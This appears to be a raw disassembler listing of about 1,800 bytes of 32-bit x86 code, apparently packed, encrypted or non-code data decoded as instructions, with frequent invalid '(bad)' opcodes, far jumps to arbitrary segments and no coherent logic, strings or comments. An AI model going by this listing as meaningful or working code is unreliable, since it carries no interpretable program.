  4101c0:	cwde   
  4101c1:	test   al,0x29
  4101c3:	sbb    ebx,DWORD PTR [ebx]
  4101c5:	mov    ch,0x43
  4101c7:	or     ebp,DWORD PTR [esi+0x76]
  4101ca:	and    BYTE PTR [eax],bl
  4101cc:	adc    eax,0xf1501b1d
  4101d1:	add    eax,0x6ce0e218
  4101d6:	(bad)  
  4101d7:	(bad)  
  4101d9:	shl    DWORD PTR [ebp+edi*4-0x3],cl
  4101dd:	sbb    al,0x64
  4101df:	cmp    eax,edi
  4101e1:	iret   
  4101e2:	jl     0x410231
  4101e4:	pop    eax
  4101e5:	icebp  
  4101e6:	popa   
  4101e7:	fs jne 0x4101e9
  4101ea:	jo     0x4101b6
  4101ec:	mov    dl,BYTE PTR [ecx]
  4101ee:	push   eax
  4101ef:	rol    DWORD PTR [edx+0x69],cl
  4101f2:	iret   
  4101f3:	addr16 rcl bl,1
  4101f6:	mov    ds,WORD PTR [edi]
  4101f8:	xor    al,0x74
  4101fa:	sbb    DWORD PTR [ebp+0x7c],ebp
  4101fd:	sbb    BYTE PTR [edx+0x74],al
  410200:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  410202:	ret    0xbc1a
  410205:	daa    
  410206:	and    eax,0x8dce1d0e
  41020b:	jbe    0x410194
  41020d:	lea    ecx,[ebp+0x70970d43]
  410213:	push   ebp
  410214:	loopne 0x410207
  410216:	clc    
  410217:	sub    al,0xde
  410219:	mov    ebp,DWORD PTR [ebp+edx*4-0x41]
  41021d:	xlat   BYTE PTR ds:[ebx]
  41021e:	pop    edx
  41021f:	std    
  410220:	jb     0x4101d9
  410222:	je     0x4101d0
  410224:	popa   
  410225:	mov    ecx,0xbf3003f7
  41022a:	ficomp DWORD PTR [ecx-0x264178f0]
  410230:	mov    dl,BYTE PTR [edi+0x2486c8a0]
  410236:	mov    esi,0xc95ccbec
  41023b:	jns    0x4101fb
  41023d:	dec    edx
  41023e:	push   ebp
  41023f:	sbb    DWORD PTR [ebx],0x4b180fa6
  410245:	add    eax,ebp
  410247:	mov    ebx,0x216b8e8d
  41024c:	sbb    bh,bh
  41024e:	int3   
  41024f:	sti    
  410250:	out    0xb3,al
  410252:	loope  0x410250
  410254:	sub    DWORD PTR [edx],ebx
  410256:	sbb    eax,ebx
  410258:	aad    0x3b
  41025a:	js     0x410222
  41025c:	ret    
  41025d:	sahf   
  41025e:	and    al,0x83
  410260:	dec    ebp
  410261:	xor    eax,0x6ce6bbd
  410266:	sbb    edx,ebp
  410268:	dec    ecx
  410269:	and    BYTE PTR [ebp-0x6b],dl
  41026c:	jle    0x41027e
  41026e:	push   0x5
  410270:	(bad)  
  410271:	ins    BYTE PTR es:[edi],dx
  410272:	mov    eax,0x82b7092e
  410277:	and    eax,0xac438d5c
  41027c:	xchg   ebx,eax
  41027d:	stos   DWORD PTR es:[edi],eax
  41027e:	test   BYTE PTR [eax+0x7dae0f4a],bh
  410284:	jb     0x4102d6
  410286:	or     al,0xa3
  410288:	mov    ds:0x2c85465c,eax
  41028d:	inc    edx
  41028e:	fsub   DWORD PTR [edi]
  410290:	mov    bh,0x81
  410292:	addr16 pop ecx
  410294:	cmp    eax,edx
  410296:	push   es
  410297:	mov    cl,0x26
  410299:	and    bh,BYTE PTR [ebp+0x72294fe8]
  41029f:	cdq    
  4102a0:	lahf   
  4102a1:	popf   
  4102a2:	add    al,0x14
  4102a4:	sbb    DWORD PTR [eax+ebp*1+0x53],edx
  4102a8:	push   ecx
  4102a9:	dec    esi
  4102aa:	jecxz  0x410261
  4102ac:	mov    al,0xff
  4102ae:	push   cs
  4102af:	gs mov edi,0xb125ea9d
  4102b5:	jmp    0x41025a
  4102b7:	pushf  
  4102b8:	mov    ah,0x2f
  4102ba:	push   cs
  4102bb:	jnp    0x41029e
  4102bd:	push   ss
  4102be:	pop    ds
  4102bf:	gs js  0x4102b7
  4102c2:	adc    eax,0x83748cc3
  4102c7:	push   esi
  4102c8:	pop    ss
  4102c9:	push   ebx
  4102ca:	out    0x2d,al
  4102cc:	loopne 0x4102a5
  4102ce:	(bad)  
  4102cf:	popf   
  4102d0:	add    al,0x61
  4102d2:	mov    esp,0xd1d9c101
  4102d7:	inc    ebx
  4102d8:	pop    es
  4102d9:	jmp    0x4102e0
  4102db:	test   DWORD PTR [edx+ecx*1],0x103ef82e
  4102e2:	repz xor cl,BYTE PTR [eax]
  4102e5:	pushf  
  4102e6:	adc    edi,DWORD PTR [esp+ebp*8-0x287186f3]
  4102ed:	add    ecx,ebp
  4102ef:	repz inc ebx
  4102f1:	bnd jle 0x4102af
  4102f4:	pop    edx
  4102f5:	retf   0xbb3f
  4102f8:	mov    WORD PTR [esi+0x35a34130],ss
  4102fe:	aam    0x31
  410300:	cwde   
  410301:	cs xchg edi,eax
  410303:	scas   eax,DWORD PTR es:[edi]
  410304:	push   eax
  410305:	stos   DWORD PTR es:[edi],eax
  410306:	dec    eax
  410307:	int3   
  410308:	sub    al,0x52
  41030a:	in     eax,dx
  41030b:	daa    
  41030c:	pop    eax
  41030d:	mov    eax,ds:0xd6c35fbb
  410312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410313:	adc    DWORD PTR [ecx+edx*2-0x40661ad7],eax
  41031a:	jno    0x41032a
  41031c:	out    0xda,eax
  41031e:	out    0x58,eax
  410320:	jg     0x4102cb
  410322:	xchg   ecx,eax
  410323:	neg    BYTE PTR [ebx]
  410325:	xchg   edx,eax
  410326:	cli    
  410327:	pop    edi
  410328:	or     BYTE PTR [ebp+0xd],cl
  41032b:	jl     0x4102d6
  41032d:	loopne 0x410337
  41032f:	lahf   
  410330:	popf   
  410331:	je     0x41032c
  410333:	pop    ecx
  410334:	dec    edi
  410335:	and    DWORD PTR ds:0xeb36,0x50
  41033b:	pushf  
  41033c:	js     0x41038a
  41033e:	sub    BYTE PTR [eax-0x1f],ch
  410341:	jl     0x41030b
  410343:	pop    ebp
  410344:	mov    ah,bl
  410346:	fmulp  st(5),st
  410348:	ja     0x410313
  41034a:	xchg   ax,ax
  41034c:	mov    ch,0xb6
  41034f:	(bad)  
  410351:	inc    ebp
  410352:	adc    BYTE PTR [edx+0x25],0x5
  410356:	nop
  410357:	push   ecx
  410358:	cmc    
  410359:	dec    edi
  41035a:	push   ss
  41035b:	pop    esp
  41035c:	lods   eax,DWORD PTR ds:[esi]
  41035d:	daa    
  41035e:	aam    0xf1
  410360:	int    0x31
  410362:	mov    edi,0xe074e456
  410367:	rcl    DWORD PTR [esi],0x31
  41036a:	pusha  
  41036b:	dec    DWORD PTR [ecx-0x605f3e7e]
  410371:	fist   DWORD PTR [edx+0x2f4d788c]
  410377:	mov    edi,0x31816834
  41037c:	mov    ds:0x66ed9222,al
  410381:	lock xor BYTE PTR [esi-0x48],bl
  410385:	xor    al,BYTE PTR [eax+0x19]
  410388:	jmp    0xf629f60
  41038d:	test   DWORD PTR [edi],esp
  41038f:	or     BYTE PTR [eax+0x346a7a94],al
  410395:	enter  0xed3e,0xb0
  410399:	xor    dl,BYTE PTR [eax]
  41039b:	mov    bh,0x3e
  41039d:	icebp  
  41039e:	cmp    al,0xe0
  4103a0:	out    dx,al
  4103a1:	jbe    0x410347
  4103a3:	in     eax,dx
  4103a4:	je     0x410350
  4103a6:	aam    0xa9
  4103a8:	in     eax,0xb0
  4103aa:	mov    ds:0x7196012c,al
  4103af:	ss push ss
  4103b1:	inc    eax
  4103b2:	ret    
  4103b3:	ja     0x41042a
  4103b5:	xor    al,0xf5
  4103b7:	push   0xe73b1823
  4103bc:	dec    edx
  4103bd:	add    esi,DWORD PTR [ebx+0x72]
  4103c0:	jmp    0x4103b1
  4103c2:	js     0x410389
  4103c4:	fcom   st(7)
  4103c6:	mov    BYTE PTR [edi*4+0xb111d31],cl
  4103cd:	or     al,0xd1
  4103cf:	std    
  4103d0:	add    ebx,DWORD PTR [ebp+0x1f]
  4103d3:	xchg   ebp,eax
  4103d4:	inc    esi
  4103d5:	mov    eax,ds:0x98859986
  4103da:	xchg   ebx,eax
  4103db:	clc    
  4103dc:	or     DWORD PTR [eax],0xfffffffc
  4103df:	xor    eax,0xd050630c
  4103e4:	or     bh,bl
  4103e6:	arpl   WORD PTR [edi+edx*1-0xf621746],si
  4103ed:	in     eax,0x9d
  4103ef:	or     DWORD PTR [esi+ecx*4-0x2f],ebx
  4103f3:	xor    al,0x60
  4103f5:	xlat   BYTE PTR ds:[ebx]
  4103f6:	call   0xd5f3:0xdca42b15
  4103fd:	jmp    0xfc66:0x5bc2c2aa
  410404:	loopne 0x4103a8
  410406:	sahf   
  410407:	sub    al,0x31
  410409:	lock push ecx
  41040b:	scas   eax,DWORD PTR es:[edi]
  41040c:	dec    edx
  41040d:	leave  
  41040e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41040f:	pop    es
  410410:	adc    al,0x35
  410412:	mov    ah,0x14
  410414:	sti    
  410415:	add    DWORD PTR [ebx],edi
  410417:	in     al,dx
  410418:	lahf   
  410419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41041a:	sbb    ah,BYTE PTR [ebx-0x3]
  41041d:	sahf   
  41041e:	hlt    
  41041f:	popf   
  410420:	sbb    dh,BYTE PTR [edx+0x67]
  410423:	push   eax
  410424:	sahf   
  410425:	iret   
  410426:	ret    
  410427:	jle    0x41043d
  410429:	sar    BYTE PTR [edi],cl
  41042b:	out    0xd9,eax
  41042d:	pop    esi
  41042e:	(bad)  
  41042f:	pop    ds
  410430:	push   edx
  410431:	rcl    BYTE PTR [edi-0x3e5f8434],cl
  410437:	cli    
  410438:	xor    ch,BYTE PTR [ebx+0x44]
  41043b:	sahf   
  41043c:	cdq    
  41043d:	mov    ds:0xa4b7f978,al
  410442:	inc    esi
  410443:	fisubr WORD PTR [eax]
  410445:	push   ecx
  410446:	or     al,0x7d
  410448:	imul   esi,DWORD PTR [edi+0x13],0xffffff94
  41044c:	cmp    bh,BYTE PTR [esi+edx*4]
  41044f:	mov    esi,DWORD PTR [ebp+0x1bb66eed]
  410455:	add    al,0xf5
  410457:	adc    eax,0xd50f2ec5
  41045c:	ins    BYTE PTR es:[edi],dx
  41045d:	sub    esi,DWORD PTR fs:[edx+ebx*8-0x45]
  410462:	xchg   esp,eax
  410463:	je     0x4103f6
  410465:	mov    edx,0x3eba111e
  41046a:	sbb    ch,al
  41046c:	je     0x41043d
  41046e:	cmp    BYTE PTR [ebp-0x3b],0xb3
  410472:	in     al,dx
  410473:	add    DWORD PTR [edi+eiz*1-0x2d090b85],0x7a
  41047b:	es dec esp
  41047d:	into   
  41047e:	icebp  
  41047f:	sub    al,0x28
  410481:	and    eax,0x955738a1
  410486:	out    0xc4,al
  410488:	add    esp,DWORD PTR [ebx]
  41048a:	jmp    0x6d4e:0x3e81bb6
  410491:	es loope 0x41043b
  410494:	cmp    al,0x1f
  410496:	add    al,0xfc
  410498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410499:	push   0xd53a8583
  41049e:	aaa    
  41049f:	(bad)  
  4104a0:	call   0xc4d2:0xa31e2580
  4104a7:	(bad)
  4104ac:	ficom  DWORD PTR [edx-0x4d634f25]
  4104b2:	rol    DWORD PTR [esi-0x32],0x37
  4104b6:	into   
  4104b7:	pop    es
  4104b8:	fwait
  4104b9:	(bad)  
  4104ba:	xor    eax,0xd6641511
  4104bf:	ins    DWORD PTR es:[edi],dx
  4104c0:	mov    BYTE PTR [ecx],cl
  4104c2:	in     al,0x9d
  4104c4:	ins    DWORD PTR es:[edi],dx
  4104c5:	cli    
  4104c6:	scas   eax,DWORD PTR es:[edi]
  4104c7:	arpl   WORD PTR [esi],cx
  4104c9:	sbb    edx,DWORD PTR [ebx]
  4104cb:	sub    BYTE PTR [ecx-0x3f6996a1],ch
  4104d1:	fsub   QWORD PTR [edx+0x44906912]
  4104d7:	cmp    BYTE PTR [ebx],bl
  4104d9:	push   ebp
  4104da:	fmul   DWORD PTR [ebp+0x77]
  4104dd:	idiv   DWORD PTR [esi+0x56]
  4104e0:	pop    edi
  4104e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e2:	add    BYTE PTR [edi+0x3ceba43e],ah
  4104e8:	jle    0x41048c
  4104ea:	xchg   edx,eax
  4104eb:	dec    esi
  4104ec:	jne    0x4104d7
  4104ee:	lods   eax,DWORD PTR ds:[esi]
  4104ef:	mov    dh,0xb5
  4104f1:	lds    esi,FWORD PTR [bx+di]
  4104f4:	ret    0x6892
  4104f7:	outs   dx,BYTE PTR ds:[esi]
  4104f8:	cmp    eax,0x13098f91
  4104fd:	jns    0x4104f6
  4104ff:	cmp    DWORD PTR [edx],0x81a16fb
  410505:	push   esi
  410506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410507:	pusha  
  410508:	int3   
  410509:	ficom  WORD PTR [eax]
  41050b:	loope  0x410536
  41050d:	mov    eax,ds:0x46f4980b
  410512:	mov    edx,0xfad4a729
  410517:	rcr    al,0x11
  41051a:	pop    es
  41051b:	adc    edx,ebp
  41051d:	lea    ecx,es:[esi-0x1b]
  410521:	les    ebx,FWORD PTR [esi-0x291f8830]
  410527:	adc    cl,BYTE PTR [ecx+0x7a]
  41052a:	fild   WORD PTR [edi-0x48]
  41052d:	icebp  
  41052e:	(bad)  
  41052f:	rol    DWORD PTR [esi],1
  410531:	(bad)  
  410532:	xchg   ecx,eax
  410533:	mov    esi,0x82b0f17d
  410538:	cmp    dh,BYTE PTR [esi]
  41053a:	sti    
  41053b:	jp     0x410515
  41053d:	scas   eax,DWORD PTR es:[edi]
  41053e:	enter  0x557f,0x74
  410542:	dec    edx
  410543:	inc    ebp
  410544:	cmp    eax,DWORD PTR ds:0xcc77ed32
  41054a:	add    BYTE PTR [edx-0x6dca5fa],al
  410550:	mov    dh,0x13
  410552:	xchg   ebx,eax
  410553:	loope  0x41056c
  410555:	rcl    BYTE PTR [ecx+eax*2],cl
  410558:	out    dx,eax
  410559:	das    
  41055a:	inc    eax
  41055b:	out    0xeb,al
  41055d:	fwait
  41055e:	ds psubw mm3,QWORD PTR fs:[ebx+0x7b]
  410564:	mov    eax,ds:0x8970cf04
  410569:	xlat   BYTE PTR ds:[ebx]
  41056a:	jge    0x410545
  41056c:	lds    edx,FWORD PTR [esi]
  41056e:	sbb    ecx,DWORD PTR [edx-0x6e]
  410571:	(bad)  [edi+0x53d1593d]
  410577:	push   edx
  410578:	int    0xe2
  41057a:	xchg   ecx,eax
  41057b:	add    al,0x1c
  41057d:	outs   dx,BYTE PTR ds:[esi]
  41057e:	push   esi
  41057f:	mov    eax,0xd6f5bc8a
  410584:	mov    esp,0x4eb51e00
  410589:	mov    ebp,0xf3642554
  41058e:	adc    bh,BYTE PTR [edx-0x54]
  410591:	push   edi
  410592:	inc    esp
  410593:	fistp  QWORD PTR [ebx]
  410595:	mov    eax,0xb6208181
  41059a:	arpl   si,si
  41059c:	stos   DWORD PTR es:[edi],eax
  41059d:	js     0x4105d2
  41059f:	loope  0x41054c
  4105a1:	pop    ss
  4105a2:	pop    ss
  4105a3:	push   0xe93aea98
  4105a8:	(bad)  
  4105a9:	jmp    0xce406702
  4105ae:	pop    ebp
  4105af:	call   0x4d4b:0xf876b71e
  4105b6:	arpl   si,si
  4105b8:	pop    es
  4105b9:	xchg   edx,eax
  4105ba:	mov    al,ds:0x8b7427d7
  4105bf:	push   edx
  4105c0:	sub    ebp,DWORD PTR [edi+0x2a]
  4105c3:	adc    al,0xcc
  4105c5:	test   eax,0xd304d8e2
  4105ca:	cmp    ch,0x7d
  4105cd:	imul   ebx,DWORD PTR ds:0x658dbf05,0x7660abf
  4105d7:	fs in  eax,0xb
  4105da:	mov    ah,0x61
  4105dc:	cmp    BYTE PTR [ecx-0x63],dh
  4105df:	out    0x8b,al
  4105e1:	adc    ecx,DWORD PTR [ebp+0x17]
  4105e4:	jmp    0x4105e4
  4105e6:	es cmc 
  4105e8:	ins    BYTE PTR es:[edi],dx
  4105e9:	nop
  4105ea:	xchg   edi,eax
  4105eb:	test   eax,0x8343cbdc
  4105f0:	jle    0x41059c
  4105f2:	mov    edx,0xfc234c5e
  4105f7:	int    0xa1
  4105f9:	xchg   edx,eax
  4105fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105fb:	fwait
  4105fc:	inc    esp
  4105fd:	cli    
  4105fe:	inc    esp
  4105ff:	dec    ebx
  410600:	mov    edi,eax
  410602:	xchg   edi,eax
  410603:	mov    bh,0x1c
  410605:	xlat   BYTE PTR ds:[ebx]
  410606:	jmp    0x410605
  410608:	ja     0x41059b
  41060a:	popa   
  41060b:	cmp    ebp,DWORD PTR [esi+0x3f]
  41060e:	jmp    0x2805e84e
  410613:	cld    
  410614:	jmp    0x14a8:0x5b49339
  41061b:	add    DWORD PTR [edi+0x35a1ac1b],edx
  410621:	add    eax,0x3258a028
  410626:	(bad)  [ebp-0x74]
  410629:	add    eax,0x88a3f0e1
  41062e:	xchg   edx,eax
  41062f:	shl    BYTE PTR [eax+0x6c98315e],0x5e
  410636:	add    bh,bl
  410638:	scas   al,BYTE PTR es:[edi]
  410639:	push   esi
  41063a:	in     al,dx
  41063b:	ret    0x590c
  41063e:	add    eax,0x8200590b
  410643:	rcr    DWORD PTR [ecx+esi*1-0x6814e3a0],0xda
  41064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41064c:	pop    esp
  41064d:	sbb    dl,BYTE PTR [ecx]
  41064f:	adc    DWORD PTR [ecx],ebx
  410651:	bound  ebp,QWORD PTR [ebp-0x80]
  410654:	pop    es
  410655:	or     BYTE PTR [ecx],bh
  410657:	stos   BYTE PTR es:[edi],al
  410658:	jmp    FWORD PTR [edi-0x51ea854]
  41065e:	xchg   edx,eax
  41065f:	cwde   
  410660:	adc    BYTE PTR [esi+ebp*4-0x2886eb37],al
  410667:	inc    esp
  410668:	fst    DWORD PTR ds:0xe1614510
  41066e:	test   DWORD PTR [edx-0x16968158],ecx
  410674:	pushf  
  410675:	mov    al,ds:0xb5c50c27
  41067a:	out    dx,eax
  41067b:	idiv   DWORD PTR [edi-0x5e]
  41067e:	push   0xffffffee
  410680:	sbb    DWORD PTR [ebp+0x4f56b30e],0xffffffd7
  410687:	sbb    BYTE PTR [edx],bl
  410689:	jne    0x410622
  41068b:	or     BYTE PTR [ebx],ch
  41068d:	test   eax,0x533ea2f7
  410692:	mov    edi,0x7c8fe30f
  410697:	mov    ebx,0x57c66a0a
  41069c:	sub    BYTE PTR [edi-0x76],0xbe
  4106a0:	push   edi
  4106a1:	js     0x41063a
  4106a3:	je     0x4106d5
  4106a5:	add    cl,BYTE PTR [edi]
  4106a7:	into   
  4106a8:	sbb    esp,ebx
  4106aa:	add    bh,BYTE PTR ds:0xe2c12eac
  4106b0:	mov    ds:0x788a0ba,eax
  4106b5:	inc    esp
  4106b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106b7:	jl     0x41072c
  4106b9:	mov    bh,0x90
  4106bb:	and    al,0x9
  4106bd:	mov    ch,0x8a
  4106bf:	pushf  
  4106c0:	sbb    esi,edx
  4106c2:	lahf   
  4106c3:	sbb    al,0x9e
  4106c5:	test   eax,0xc669fe90
  4106ca:	inc    edi
  4106cb:	(bad)  
  4106cc:	jne    0x41070a
  4106ce:	fwait
  4106cf:	dec    ebp
  4106d0:	push   0x65114d60
  4106d5:	mov    eax,ds:0xdb871054
  4106da:	pop    es
  4106db:	add    eax,0x9a4be3cb
  4106e0:	cwde   
  4106e1:	jo     0x410673
  4106e3:	mov    eax,ds:0x714138a0
  4106e8:	ror    ch,0x71
  4106eb:	jge    0x41067f
  4106ed:	and    al,0xc5
  4106ef:	ins    DWORD PTR es:[edi],dx
  4106f0:	nop
  4106f1:	dec    ecx
  4106f2:	mov    ds:0xbf886608,al
  4106f7:	loopne 0x410687
  4106f9:	xor    eax,0xfea3aa40
  4106fe:	pop    eax
  4106ff:	jnp    0x4106d6
  410701:	pop    ebp
  410702:	sahf   
  410703:	rcr    DWORD PTR [eax+0x7cfe21c5],1
  410709:	rol    DWORD PTR [ebx+0x6a],1
  41070c:	(bad)  
  41070d:	adc    DWORD PTR [edi+0x2943b516],ebp
  410713:	sbb    eax,0x1ba6674c
  410718:	xlat   BYTE PTR ds:[ebx]
  410719:	sub    ch,BYTE PTR [ebx]
  41071b:	push   ss
  41071c:	push   ss
  41071d:	cs aam 0x7e
  410720:	push   esp
  410721:	dec    edi
  410722:	retf   0x168e
  410725:	or     eax,0xb2d2b802
  41072a:	push   ds
  41072b:	stc    
  41072c:	mov    edx,0x2d8a9ad9
  410731:	aaa    
  410732:	(bad)  
  410733:	pushf  
  410734:	sub    cl,BYTE PTR [ebx+0x5d66c9fe]
  41073a:	cmp    eax,0x37bc3bd8
  41073f:	sub    al,0x3f
  410741:	les    esi,FWORD PTR [ebx-0x80]
  410744:	ins    DWORD PTR es:[edi],dx
  410745:	xor    DWORD PTR [edx+0x66fb6d6f],esp
  41074b:	dec    eax
  41074c:	es out 0x3d,eax
  41074f:	or     DWORD PTR [esi+0x60376acb],esp
  410755:	shr    BYTE PTR [esp+edx*2],cl
  410758:	dec    edx
  410759:	fimul  DWORD PTR [edx+0x1302f187]
  41075f:	leave  
  410760:	push   ss
  410761:	xchg   ebp,eax
  410762:	adc    bh,bh
  410764:	inc    edx
  410765:	pop    edi
  410766:	inc    ebp
  410767:	sub    al,0x6a
  410769:	jbe    0x410746
  41076b:	clc    
  41076c:	pop    edi
  41076d:	ja     0x410704
  41076f:	lea    edi,[edx+0x54]
  410772:	sub    BYTE PTR [ebx-0x4],bl
  410775:	les    ebp,FWORD PTR [eax+0x71]
  410778:	mov    dh,BYTE PTR [edx+ebp*4+0x6b1cfc8a]
  41077f:	jmp    0x30c94fc0
  410784:	popa   
  410785:	push   cs
  410786:	repnz mov dh,0x67
  410789:	inc    ebp
  41078a:	pop    ss
  41078b:	jge    0x410766
  41078d:	adc    bl,dh
  41078f:	icebp  
  410790:	sbb    ebx,DWORD PTR [esi+0x58bda692]
  410796:	enter  0xbd59,0xc7
  41079a:	sub    edx,DWORD PTR [esi]
  41079c:	clc    
  41079d:	and    ecx,DWORD PTR [eax+esi*2+0x66bea99e]
  4107a4:	sbb    ah,BYTE PTR ds:0xaa56d012
  4107aa:	mov    esp,0x45786f8a
  4107af:	adc    DWORD PTR [edx+edi*2-0x28],0xdbc547b8
  4107b7:	outs   dx,BYTE PTR ds:[esi]
  4107b8:	or     al,0x48
  4107ba:	xchg   edx,eax
  4107bb:	mul    DWORD PTR [ecx+0x47]
  4107be:	dec    eax
  4107bf:	and    eax,0x96c0d49
  4107c4:	in     al,dx
  4107c5:	pop    edx
  4107c6:	mov    esp,0x65ebfea2
  4107cb:	mov    bh,0xb2
  4107cd:	inc    edi
  4107ce:	or     DWORD PTR [edi],ecx
  4107d0:	stc    
  4107d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107d2:	arpl   WORD PTR [ebx+ecx*2+0x71],di
  4107d6:	(bad)  
  4107d7:	fwait
  4107d8:	adc    al,0xd7
  4107da:	ror    DWORD PTR [ecx-0x7f],cl
  4107dd:	mov    esi,0x62e70009
  4107e2:	or     bl,BYTE PTR ds:0x1cfe9197
  4107e8:	int    0x88
  4107ea:	int    0x70
  4107ec:	test   eax,0xea2f655d
  4107f1:	mov    al,ds:0x4fcd392f
  4107f6:	(bad)  
  4107f7:	fldz   
  4107f9:	ja     0x41086a
  4107fb:	sbb    eax,0xf0b457b3
  410800:	and    DWORD PTR [ecx+edi*2+0x72],esp
  410804:	stos   BYTE PTR es:[edi],al
  410805:	scas   eax,DWORD PTR es:[edi]
  410806:	or     ecx,DWORD PTR [eax+0xcf34883]
  41080c:	retf   0xad69
  41080f:	inc    esi
  410810:	cdq    
  410811:	and    dh,BYTE PTR [edx]
  410813:	mov    ecx,0xda46439f
  410818:	rol    ecx,0x7f
  41081b:	push   edx
  41081c:	retf   0xc0ca
  41081f:	lds    ebx,FWORD PTR [eax+0x58d0e002]
  410825:	xor    DWORD PTR [ebp-0xb],esi
  410828:	jle    0x41085e
  41082a:	leave  
  41082b:	leave  
  41082c:	push   ebp
  41082d:	sbb    ecx,edi
  41082f:	mov    bl,0x5
  410831:	fistp  QWORD PTR [edx+0x57]
  410834:	cmp    ch,cl
  410836:	popa   
  410837:	xchg   ebx,eax
  410838:	lahf   
  410839:	scas   eax,DWORD PTR es:[edi]
  41083a:	and    al,0xa
  41083c:	aad    0x3e
  41083e:	icebp  
  41083f:	lock cmc 
  410841:	outs   dx,DWORD PTR fs:[esi]
  410843:	xchg   ebx,eax
  410844:	repnz dec esp
  410846:	imul   edi,DWORD PTR [esi],0xffffffee
  410849:	gs daa 
  41084b:	dec    ebp
  41084c:	imul   edx,ebp,0xb45f83d1
  410852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410853:	shl    BYTE PTR [ecx+0x3cc2e939],0x35
  41085a:	adc    bl,dl
  41085c:	mov    dl,cl
  41085e:	fsubr  QWORD PTR [eax+esi*4+0x4c]
  410862:	fcomp  st(6)
  410864:	inc    edx
  410865:	jge    0x4108ac
  410867:	rcr    dl,0x62
  41086a:	dec    esp
  41086b:	arpl   WORD PTR [eax-0x23],cx
  41086e:	mov    ebp,0x699a527e
  410873:	xor    dh,BYTE PTR [edi]
  410875:	into   
  410876:	mov    cl,0x4b
  410878:	pop    ss
  410879:	(bad)  
  41087a:	dec    edi
  41087b:	into   
  41087c:	adc    esi,eax
  41087e:	mov    esp,ss
  410880:	arpl   di,si
  410882:	inc    esp
  410883:	outs   dx,BYTE PTR ds:[esi]
  410884:	or     BYTE PTR ss:[edi+0x20f89c2e],0x6b
  41088c:	inc    ebx
  41088d:	push   0xc645f62d
  410892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410893:	mov    WORD PTR [edx-0xe],cs
  410896:	mov    ds:0x8a2ba91e,al
  41089b:	push   DWORD PTR [ebp+eiz*2-0x53]
  41089f:	dec    ecx
  4108a0:	das    
  4108a1:	mov    dl,0x74
  4108a3:	popf   
  4108a4:	inc    esi
  4108a5:	sub    eax,0x3d421e4c
  4108aa:	inc    edx
  4108ab:	sti    
  4108ac:	cmp    ax,0x8e2a
  4108b0:	cs inc ecx
  4108b2:	mov    esi,0xcd6772d0
  4108b7:	(bad)  
  4108b8:	(bad)  
  4108b9:	in     al,dx
  4108ba:	adc    al,0x58
  4108bc:	xlat   BYTE PTR ds:[ebx]
  4108bd:	rcr    dl,0x1
  4108c0:	in     eax,0xfc
  4108c2:	pop    es
  4108c3:	test   al,0xb0
  4108c5:	mov    ecx,0x72c59e4
  4108ca:	out    0x4,eax
  4108cc:	mov    cl,0x9b
  4108ce:	imul   ecx,esi,0x5e
  4108d1:	push   edi
  4108d2:	outs   dx,DWORD PTR ds:[esi]
  4108d3:	inc    edx
  4108d4:	jnp    0x41092b
  4108d6:	stos   BYTE PTR es:[edi],al
  4108d7:	mov    bh,0xc
  4108d9:	mov    bh,0x5e
  4108db:	adc    edx,esi
  4108dd:	mov    ah,0xda
  4108df:	out    dx,eax
  4108e0:	adc    al,0x1b
  4108e2:	mov    al,ds:0x61fca82b
  4108e7:	push   cs
  4108e8:	xor    bl,ah
  4108ea:	scas   eax,DWORD PTR es:[edi]
  4108eb:	pop    esp
  4108ec:	adc    ecx,DWORD PTR [esi]
  4108ee:	jne    0x410965
  4108f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108f1:	test   al,0x1a
  4108f3:	cmp    DWORD PTR [esi-0x49cb948e],0x59
  4108fa:	xchg   esp,eax
  4108fb:	test   DWORD PTR [eax-0x3],esi
  4108fe:	ret    0x8a61
  410901:	dec    esp
  410902:	lea    esi,[esi]
  410904:	stos   DWORD PTR es:[edi],eax
  410905:	data16 mov BYTE PTR [eax],bh
  410908:	leave  
  410909:	adc    cl,dl
  41090b:	retf   
  41090c:	push   esp
  41090d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090e:	(bad)
  410912:	retf   
  410913:	inc    ebx
  410914:	outs   dx,BYTE PTR ds:[esi]
  410915:	test   BYTE PTR [ecx-0x1265cae8],dl
  41091b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41091c:	dec    edx
  41091d:	pop    esi
  41091e:	xor    dh,BYTE PTR fs:[esi-0x34]
  410922:	sbb    eax,DWORD PTR [edi-0x61]
  410925:	les    ebx,FWORD PTR [eax-0x77]
  410928:	or     edx,DWORD PTR [edx+0x76ff6f31]
  41092e:	dec    edi
  41092f:	inc    ebx
  410930:	mov    dh,0x3c
  410932:	xor    DWORD PTR [ebx-0x235af18f],esp
  410938:	sub    ebx,esp
  41093a:	push   edi
  41093b:	inc    ebp
  41093c:	sbb    al,0x78
  41093e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41093f:	adc    ah,dl
  410941:	adc    esp,DWORD PTR [eax]
  410943:	(bad)  
  410944:	push   esp
  410946:	arpl   WORD PTR ds:0x5b0739f7,si
  41094c:	add    al,0xc3
  41094e:	push   edx
  41094f:	and    DWORD PTR [ebx-0x40],ecx
  410952:	sar    DWORD PTR [edi+esi*1-0x1e5c3131],0x2e
  41095a:	xlat   BYTE PTR ds:[ebx]
  41095b:	cmp    BYTE PTR [ebp-0xadd9495],0x5a
  410962:	push   ecx
  410963:	cmp    al,0xa4
  410965:	mov    ebp,0x7be7bbe5
  41096a:	cli    
  41096b:	sbb    DWORD PTR [eax-0x7d],ebx
  41096e:	jge    0x41098a
  410970:	in     eax,dx
  410971:	add    al,BYTE PTR [eax]
  410973:	(bad)  
  410974:	jmp    0x6765305c
  410979:	jns    0x41093e
